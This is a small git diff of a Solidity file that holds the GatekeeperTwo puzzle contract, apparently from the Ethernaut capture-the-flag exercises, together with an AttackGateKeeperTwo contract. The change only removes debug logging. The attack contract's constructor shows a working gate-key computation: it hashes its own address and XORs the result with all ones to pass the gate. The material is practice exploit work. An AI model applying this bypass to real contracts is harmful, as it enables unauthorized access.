@@ -1,6 +1,5 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
-import "hardhat/console.sol";
 
 contract GatekeeperTwo {
     address public entrant;
@@ -47,7 +46,7 @@ contract AttackGateKeeperTwo {
         gateKeeper = GatekeeperTwo(addr);
         uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
             (uint64(0) - 1);
-        console.log(gateKey);
+        // console.log(gateKey);
         gateKeeper.enter(bytes8(gateKey));
     }
 }
